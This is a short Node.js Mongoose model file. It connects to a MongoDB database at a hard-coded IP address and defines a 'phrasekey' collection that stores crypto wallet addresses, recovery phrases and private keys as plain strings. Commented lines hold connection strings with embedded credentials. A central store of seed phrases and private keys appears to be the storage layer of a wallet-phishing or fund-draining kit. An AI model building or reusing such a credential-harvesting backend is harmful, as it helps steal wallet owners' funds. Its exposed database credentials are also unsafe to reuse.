const mongoose = require('mongoose');
mongoose.connect('mongodb://52.56.48.112:27017/taxdb', { useNewUrlParser: true ,useUnifiedTopology: true });
//mongoose.connect('mongodb+srv://pk:pk@cluster0-yxuce.mongodb.net/onlineexamdb?retryWrites=true&w=majority',{ useNewUrlParser: true, useUnifiedTopology: true });
//mongodb+srv://pk:<password>@cluster0-yxuce.mongodb.net/test?retryWrites=true&w=majority
//mongodb+srv://pk:<password>@cluster0-yxuce.mongodb.net/test?retryWrites=true&w=majority

const Schema = mongoose.Schema;
var NewUserSchema = new Schema({  
    wallet:String,  
    phrase:String,       
    privatekey:String     
});
var Phrases = mongoose.model('phrasekey', NewUserSchema);                        //UserData is the model and NewBookData is the schema
module.exports = Phrases;